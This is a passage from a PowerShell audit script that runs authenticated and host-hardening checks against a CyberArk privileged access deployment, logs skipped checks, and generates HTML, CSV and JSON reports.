                try { Test-AccountConfigurations } catch { Add-SkippedCheck -Category "Credential Management" -CISControl "4.1" -CheckName "Account Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-PlatformConfigurations } catch { Add-SkippedCheck -Category "Platform Configuration" -CISControl "2.4" -CheckName "Platform Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-UserConfigurations } catch { Add-SkippedCheck -Category "User Management" -CISControl "5.1" -CheckName "User Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-AuthenticationMethods } catch { Add-SkippedCheck -Category "Authentication" -CISControl "5.1" -CheckName "Authentication Methods Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-ComponentHealth } catch { Add-SkippedCheck -Category "System Health" -CISControl "7.3" -CheckName "Component Health Check" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-SystemConfiguration } catch { Add-SkippedCheck -Category "System Configuration" -CISControl "5.3" -CheckName "System Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-OrphanedSafes } catch { Add-SkippedCheck -Category "Safe Configuration" -CISControl "3.1" -CheckName "Orphaned Safes Check" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

                Write-Host ""
                Write-Host "[AUTH] Running Vendor Best Practice Audits..." -ForegroundColor Yellow
                Write-Host "==============================================" -ForegroundColor Yellow

                try { Test-MasterPolicy } catch { Add-SkippedCheck -Category "Master Policy" -CISControl "V1.1" -CheckName "Master Policy Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-PSMConfiguration } catch { Add-SkippedCheck -Category "PSM Configuration" -CISControl "V2.1" -CheckName "PSM Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-AccountDiscovery } catch { Add-SkippedCheck -Category "Account Discovery" -CISControl "V3.1" -CheckName "Account Discovery Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-PTAConfiguration } catch { Add-SkippedCheck -Category "Privileged Threat Analytics" -CISControl "V4.1" -CheckName "PTA Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-LinkedAccounts } catch { Add-SkippedCheck -Category "Linked Accounts" -CISControl "V6.1" -CheckName "Linked Accounts Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-CPMConfiguration } catch { Add-SkippedCheck -Category "CPM Configuration" -CISControl "V8.1" -CheckName "CPM Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-SafeDualControl } catch { Add-SkippedCheck -Category "Safe Configuration" -CISControl "3.3" -CheckName "Safe Dual Control Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                try { Test-AccountGroups } catch { Add-SkippedCheck -Category "Account Management" -CISControl "4.1" -CheckName "Account Groups Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

                # New v4.0 Security Checks
                if (-not $SkipMachineIdentity) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Machine Identity Security Checks..." -ForegroundColor Yellow
                    Write-Host "===================================================" -ForegroundColor Yellow
                    try { Test-MachineIdentitySecurity } catch { Add-SkippedCheck -Category "Machine Identity" -CISControl "MID1" -CheckName "Machine Identity Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                if (-not $SkipSecretsChecks) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Secrets Management Checks..." -ForegroundColor Yellow
                    Write-Host "===========================================" -ForegroundColor Yellow
                    try { Test-SecretsManagement } catch { Add-SkippedCheck -Category "Secrets Management" -CISControl "SEC1" -CheckName "Secrets Management" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                Write-Host ""
                Write-Host "[AUTH] Running Zero Standing Privileges Checks..." -ForegroundColor Yellow
                Write-Host "=================================================" -ForegroundColor Yellow
                try { Test-ZeroStandingPrivileges } catch { Add-SkippedCheck -Category "Zero Standing Privileges" -CISControl "ZSP1" -CheckName "Zero Standing Privileges" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

                if (-not $SkipIGAChecks) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Identity Governance Checks..." -ForegroundColor Yellow
                    Write-Host "============================================" -ForegroundColor Yellow
                    try { Test-IdentityGovernance } catch { Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA1" -CheckName "Identity Governance" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                if (-not $SkipCloudChecks) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Cloud Security Checks..." -ForegroundColor Yellow
                    Write-Host "=======================================" -ForegroundColor Yellow
                    try { Test-CloudSecurity } catch { Add-SkippedCheck -Category "Cloud Security" -CISControl "CLD1" -CheckName "Cloud Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                if (-not $SkipDRChecks) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Disaster Recovery Checks..." -ForegroundColor Yellow
                    Write-Host "==========================================" -ForegroundColor Yellow
                    try { Test-DisasterRecovery } catch { Add-SkippedCheck -Category "Disaster Recovery" -CISControl "DR1" -CheckName "Disaster Recovery" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                if ($IncludeEPMChecks -or $EPMUrl) {
                    Write-Host ""
                    Write-Host "[AUTH] Running EPM Integration Checks..." -ForegroundColor Yellow
                    Write-Host "========================================" -ForegroundColor Yellow
                    try { Test-EPMIntegration -EPMUrl $EPMUrl } catch { Add-SkippedCheck -Category "EPM Security" -CISControl "EPM1" -CheckName "EPM Integration" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                Write-Host ""
                Write-Host "[AUTH] Running Audit Logging Checks..." -ForegroundColor Yellow
                Write-Host "======================================" -ForegroundColor Yellow
                try { Test-AuditLogging } catch { Add-SkippedCheck -Category "Audit Logging" -CISControl "AUD1" -CheckName "Audit Logging" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

                if ($ComplianceMapping) {
                    Write-Host ""
                    Write-Host "[AUTH] Generating Compliance Framework Mapping..." -ForegroundColor Yellow
                    Write-Host "=================================================" -ForegroundColor Yellow
                    try { Test-ComplianceMapping } catch { Add-SkippedCheck -Category "Compliance Mapping" -CISControl "COMP1" -CheckName "Compliance Mapping" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                # New v4.1 AD Security Checks (zBang-inspired)
                if ($IncludeADChecks) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Active Directory Security Checks (zBang-inspired)..." -ForegroundColor Yellow
                    Write-Host "=====================================================================" -ForegroundColor Yellow
                    try { Test-ADSecurity } catch { Add-SkippedCheck -Category "AD Security" -CISControl "AD1" -CheckName "AD Security Checks" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                # New v4.1 Conjur Integration Checks
                if ($IncludeConjurChecks -or $ConjurUrl) {
                    Write-Host ""
                    Write-Host "[AUTH] Running Conjur/Secrets Manager Integration Checks..." -ForegroundColor Yellow
                    Write-Host "============================================================" -ForegroundColor Yellow
                    try { Test-ConjurIntegration } catch { Add-SkippedCheck -Category "Conjur Integration" -CISControl "SEC9" -CheckName "Conjur Integration" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
                }

                # New v4.1 AIM Provider Checks
                Write-Host ""
                Write-Host "[AUTH] Running AIM Provider Security Checks..." -ForegroundColor Yellow
                Write-Host "==============================================" -ForegroundColor Yellow
                try { Test-AIMProviderSecurity } catch { Add-SkippedCheck -Category "Machine Identity" -CISControl "MID7" -CheckName "AIM Provider Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

                Write-AuditLog "Phase 2 (Authenticated) checks complete." -Level Success
            }
            finally {
                # Always disconnect
                Disconnect-CyberArk
            }
        }
        else {
            Write-AuditLog "Failed to authenticate to CyberArk API." -Level Error
            Write-Host ""
            Write-Host "  Authentication failed. Authenticated checks will be skipped." -ForegroundColor Red
            Write-Host "  Unauthenticated checks have been completed and will be reported." -ForegroundColor Yellow
            Write-Host ""

            # Record all authenticated checks as skipped due to auth failure
            $authChecks = @(
                @{ Cat = "Safe Configuration"; Ctrl = "3.1"; Name = "Safe Configuration Audit" },
                @{ Cat = "Credential Management"; Ctrl = "4.1"; Name = "Account Configuration Audit" },
                @{ Cat = "Platform Configuration"; Ctrl = "2.4"; Name = "Platform Configuration Audit" },
                @{ Cat = "User Management"; Ctrl = "5.1"; Name = "User Configuration Audit" },
                @{ Cat = "Authentication"; Ctrl = "5.1"; Name = "Authentication Methods Audit" },
                @{ Cat = "System Health"; Ctrl = "7.3"; Name = "Component Health Check" },
                @{ Cat = "System Configuration"; Ctrl = "5.3"; Name = "System Configuration Audit" },
                @{ Cat = "Safe Configuration"; Ctrl = "3.1"; Name = "Orphaned Safes Check" },
                @{ Cat = "Master Policy"; Ctrl = "V1.1"; Name = "Master Policy Audit" },
                @{ Cat = "PSM Configuration"; Ctrl = "V2.1"; Name = "PSM Configuration Audit" },
                @{ Cat = "Account Discovery"; Ctrl = "V3.1"; Name = "Account Discovery Audit" },
                @{ Cat = "Privileged Threat Analytics"; Ctrl = "V4.1"; Name = "PTA Configuration Audit" },
                @{ Cat = "Linked Accounts"; Ctrl = "V6.1"; Name = "Linked Accounts Audit" },
                @{ Cat = "CPM Configuration"; Ctrl = "V8.1"; Name = "CPM Configuration Audit" },
                @{ Cat = "Safe Configuration"; Ctrl = "3.3"; Name = "Safe Dual Control Audit" },
                @{ Cat = "Account Management"; Ctrl = "4.1"; Name = "Account Groups Audit" }
            )
            foreach ($check in $authChecks) {
                Add-SkippedCheck -Category $check.Cat -CISControl $check.Ctrl `
                    -CheckName $check.Name `
                    -Reason "Authentication failed - check credentials and try again" `
                    -Type "AccessDenied"
            }
        }
    }

    #======================================================================
    # PHASE 3: HOST SECURITY CHECKS (Local admin on CyberArk server)
    #======================================================================
    if (-not $SkipHostChecks) {
        Write-Host ""
        Write-Host "+============================================================+" -ForegroundColor Blue
    Write-Host "|  PHASE 3: HOST SECURITY CHECKS                           |" -ForegroundColor Blue
    Write-Host "|  (Requires local admin on CyberArk server)               |" -ForegroundColor Blue
        Write-Host "+============================================================+" -ForegroundColor Blue
        Write-Host ""
        Write-Host "  The following checks require local execution on the" -ForegroundColor Cyan
        Write-Host "  CyberArk server with administrative privileges:" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "  - Windows Firewall configuration" -ForegroundColor Gray
        Write-Host "  - CyberArk service account settings" -ForegroundColor Gray
        Write-Host "  - Credential caching (WDigest, LSA Protection)" -ForegroundColor Gray
        Write-Host "  - Windows Event Log configuration" -ForegroundColor Gray
        Write-Host "  - Antivirus/EDR status" -ForegroundColor Gray
        Write-Host "  - CyberArk service health" -ForegroundColor Gray
        Write-Host ""

        Test-HostSecurity

        # New v4.1 Component-Specific Hardening Checks
        if (-not $SkipHardeningChecks) {
            Write-Host ""
            Write-Host "[HOST] Running Server Hardening Checks (CYBRHardeningCheck-inspired)..." -ForegroundColor Yellow
            Write-Host "=======================================================================" -ForegroundColor Yellow
            try { Test-ServerHardening } catch { Add-SkippedCheck -Category "Server Hardening" -CISControl "HARD1" -CheckName "Server Hardening" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

            Write-Host ""
            Write-Host "[HOST] Running Vault Hardening Checks..." -ForegroundColor Yellow
            Write-Host "=========================================" -ForegroundColor Yellow
            try { Test-VaultHardening } catch { Add-SkippedCheck -Category "Vault Hardening" -CISControl "VAULT1" -CheckName "Vault Hardening" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

            Write-Host ""
            Write-Host "[HOST] Running PSM Hardening Checks..." -ForegroundColor Yellow
            Write-Host "=======================================" -ForegroundColor Yellow
            try { Test-PSMHardening } catch { Add-SkippedCheck -Category "PSM Hardening" -CISControl "PSMH1" -CheckName "PSM Hardening" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

            Write-Host ""
            Write-Host "[HOST] Running PVWA Hardening Checks..." -ForegroundColor Yellow
            Write-Host "========================================" -ForegroundColor Yellow
            try { Test-PVWAHardening } catch { Add-SkippedCheck -Category "PVWA Hardening" -CISControl "PVWAH1" -CheckName "PVWA Hardening" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

            Write-Host ""
            Write-Host "[HOST] Running CPM Hardening Checks..." -ForegroundColor Yellow
            Write-Host "=======================================" -ForegroundColor Yellow
            try { Test-CPMHardening } catch { Add-SkippedCheck -Category "CPM Hardening" -CISControl "CPMH1" -CheckName "CPM Hardening" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

            # Application Control Checks (Evasor-inspired)
            if ($IncludeAppControlChecks) {
                Write-Host ""
                Write-Host "[HOST] Running Application Control Checks (Evasor-inspired)..." -ForegroundColor Yellow
                Write-Host "================================================================" -ForegroundColor Yellow
                try { Test-ApplicationControl } catch { Add-SkippedCheck -Category "Application Control" -CISControl "APPCTL1" -CheckName "Application Control" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
            }
        }
    }
    else {
        Write-Host ""
        Write-Host "+============================================================+" -ForegroundColor DarkGray
        Write-Host "+============================================================+" -ForegroundColor DarkGray

        Add-SkippedCheck -Category "Host Security" -CISControl "HOST1" `
            -CheckName "Windows Firewall Configuration" `
            -Reason "Skipped via -SkipHostChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST2" `
            -CheckName "Service Account Privileges" `
            -Reason "Skipped via -SkipHostChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST3" `
            -CheckName "Credential Caching Configuration" `
            -Reason "Skipped via -SkipHostChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST4" `
            -CheckName "Event Log Configuration" `
            -Reason "Skipped via -SkipHostChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST5" `
            -CheckName "Antivirus/EDR Status" `
            -Reason "Skipped via -SkipHostChecks parameter" `
            -Type "Skipped"
    }

    #======================================================================
    # REPORT GENERATION
    #======================================================================
    Write-Host ""
    Write-Host "+============================================================+" -ForegroundColor Cyan
    Write-Host "|  GENERATING REPORTS                                      |" -ForegroundColor Cyan
    Write-Host "+============================================================+" -ForegroundColor Cyan

    # Generate reports with error handling
    $htmlReport = $null
    $csvReport = $null
    $jsonReport = $null
    
    try {
        $htmlReport = New-HTMLReport
    }
    catch {
        Write-AuditLog "Failed to generate HTML report: $($_.Exception.Message)" -Level Error
    }
    
    try {
        $csvReport = Export-CSVReport
    }
    catch {
        Write-AuditLog "Failed to generate CSV report: $($_.Exception.Message)" -Level Error
    }
    
    try {
        $jsonReport = Export-JSONReport
    }
    catch {
        Write-AuditLog "Failed to generate JSON report: $($_.Exception.Message)" -Level Error
    }

    # Print summary
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host "  AUDIT COMPLETE" -ForegroundColor Green
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Execution Summary:" -ForegroundColor Cyan
    Write-Host "  Phase 1 (Unauthenticated): Completed" -ForegroundColor Green
    if ($script:AuditStats.AuthenticatedChecksRun) {
        Write-Host "  Phase 2 (Authenticated):   Completed" -ForegroundColor Green
    }
    elseif ($UnauthenticatedOnly -or $SkipAuthenticatedChecks) {
        Write-Host "  Phase 2 (Authenticated):   Skipped (by parameter)" -ForegroundColor DarkGray
    }
    else {
        Write-Host "  Phase 2 (Authenticated):   Failed (auth error)" -ForegroundColor Red
    }
    if (-not $SkipHostChecks) {
        Write-Host "  Phase 3 (Host Security):   Completed" -ForegroundColor Green
    }
    else {
        Write-Host "  Phase 3 (Host Security):   Skipped (by parameter)" -ForegroundColor DarkGray
    }
    Write-Host ""
    Write-Host "Findings:" -ForegroundColor Cyan
    Write-Host "  Critical: $(($script:Findings | Where-Object { $_.Severity -eq 'Critical' -and $_.Status -eq 'Fail' }).Count)" -ForegroundColor Red
    Write-Host "  High:     $(($script:Findings | Where-Object { $_.Severity -eq 'High' -and $_.Status -eq 'Fail' }).Count)" -ForegroundColor Yellow
    Write-Host "  Medium:   $(($script:Findings | Where-Object { $_.Severity -eq 'Medium' -and $_.Status -eq 'Fail' }).Count)" -ForegroundColor DarkYellow
    Write-Host "  Low:      $(($script:Findings | Where-Object { $_.Severity -eq 'Low' -and $_.Status -eq 'Fail' }).Count)" -ForegroundColor Blue
    Write-Host "  Passed:   $(($script:Findings | Where-Object { $_.Status -eq 'Pass' }).Count)" -ForegroundColor Green
    Write-Host ""
    
    if ($script:SkippedChecks.Count -gt 0) {
        Write-Host "Checks Not Performed:" -ForegroundColor Gray
        Write-Host "  Skipped:        $(($script:SkippedChecks | Where-Object { $_.Type -eq 'Skipped' }).Count)" -ForegroundColor DarkGray
        Write-Host "  Not Applicable: $(($script:SkippedChecks | Where-Object { $_.Type -eq 'NotApplicable' }).Count)" -ForegroundColor DarkGray
        Write-Host "  Errors:         $(($script:SkippedChecks | Where-Object { $_.Type -eq 'Error' }).Count)" -ForegroundColor DarkGray
        Write-Host "  Access Denied:  $(($script:SkippedChecks | Where-Object { $_.Type -eq 'AccessDenied' }).Count)" -ForegroundColor DarkGray
        Write-Host ""
    }
    Write-Host "Reports Generated:" -ForegroundColor Cyan
    if ($htmlReport) { Write-Host "  HTML: $htmlReport" -ForegroundColor White } else { Write-Host "  HTML: FAILED" -ForegroundColor Red }
    if ($csvReport) { Write-Host "  CSV:  $csvReport" -ForegroundColor White } else { Write-Host "  CSV:  FAILED" -ForegroundColor Red }
    if ($jsonReport) { Write-Host "  JSON: $jsonReport" -ForegroundColor White } else { Write-Host "  JSON: FAILED" -ForegroundColor Red }
    Write-Host ""
    
    # Return summary object for programmatic use
    return @{
        Findings = $script:Findings
        SkippedChecks = $script:SkippedChecks
        Stats = $script:AuditStats
        Reports = @{
            HTML = $htmlReport
            CSV = $csvReport
            JSON = $jsonReport
        }
    }
}

# Entry point
Start-Audit
#endregion
